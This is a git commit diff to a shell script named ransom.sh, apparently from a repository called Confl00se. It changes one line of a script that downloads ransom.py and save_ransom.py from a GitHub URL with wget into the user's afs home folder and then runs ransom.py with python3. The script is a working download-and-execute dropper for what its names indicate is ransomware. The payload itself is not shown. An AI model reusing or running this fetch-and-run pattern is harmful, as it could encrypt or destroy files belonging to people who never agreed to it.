325f16291a7087c448916d4f0ad06112506ece70
Nekro <70316327+NeKroFR@users.noreply.github.com>
2023-12-12 17:16:48 +0100

    Update ransom.sh

--- scripts/ransom.sh
+++ scripts/ransom.sh
@@ -2,5 +2,4 @@ path=$(eval echo ~$USER)/afs
 wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/ransom.py -O $path/ransom.py
 wget https://raw.githubusercontent.com/NeKroFR/Confl00se/main/scripts/save_ransom.py -O $path/save.py
 echo   > $path/path.txt
-cd $path
-python3 $path/ransom.py
+cd $path && python3 $path/ransom.py
